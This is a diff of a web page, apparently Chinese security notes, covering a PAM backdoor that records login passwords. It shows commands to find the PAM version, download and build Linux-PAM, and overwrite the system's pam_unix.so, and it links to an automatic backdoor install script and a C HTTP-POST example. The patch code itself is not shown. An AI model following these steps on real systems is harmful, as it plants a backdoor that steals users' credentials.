@@ -187,7 +187,7 @@
                 
                     <li><a class="toctree-l4" href="#pam">修改pam进行密码记录</a></li>
                 
-                    <li><a class="toctree-l4" href="#_1">代码引用：</a></li>
+                    <li><a class="toctree-l4" href="#_1">代码引用</a></li>
                 
             
             </ul>
@@ -248,8 +248,8 @@
 </code></pre>
 
 <h2 id="pam">修改pam进行密码记录</h2>
-<pre><code class="c"># http://stackoverflow.com/questions/22077802/simple-c-example-of-doing-an-http-post-and-consuming-the-response
-
+<pre><code class="shell">#查找pam版本，寻找对应的版本下载
+rpm -qa|grep -i pam
 wget http://ftp.naist.jp/pub/linux/libs/pam/library/Linux-PAM-1.1.1.tar.gz
 gzip -d Linux-PAM-1.1.1.tar.gz 
 tar xvf Linux-PAM-1.1.1.tar 
@@ -329,7 +329,7 @@ cp -rf modules/pam_unix/.libs/pam_unix.so /lib64/security/pam_unix.so
 <blockquote>
 <p>work on centos debian</p>
 </blockquote>
-<h2 id="_1">代码引用：</h2>
+<h2 id="_1">代码引用</h2>
 <ul>
 <li><a href="https://github.com/litsand/shell/blob/master/pam.sh">pam backdoor 自动安装脚本</a></li>
 <li><a href="http://stackoverflow.com/questions/22077802/simple-c-example-of-doing-an-http-post-and-consuming-the-response">C 发送HTTP请求</a></li>
